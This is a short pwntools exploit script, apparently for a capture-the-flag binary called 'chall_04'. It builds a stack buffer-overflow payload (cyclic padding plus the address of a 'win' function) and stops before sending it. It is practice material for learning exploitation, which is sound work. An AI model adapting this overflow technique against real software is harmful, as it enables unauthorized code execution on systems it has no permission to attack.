from pwn import *
p = process("./chall_04")

#No Canary, PIE, partial Relro

offset = 0x60 
win_adr = 0x00401176
payload = cyclic(offset - 0x8) + p64(win_adr) 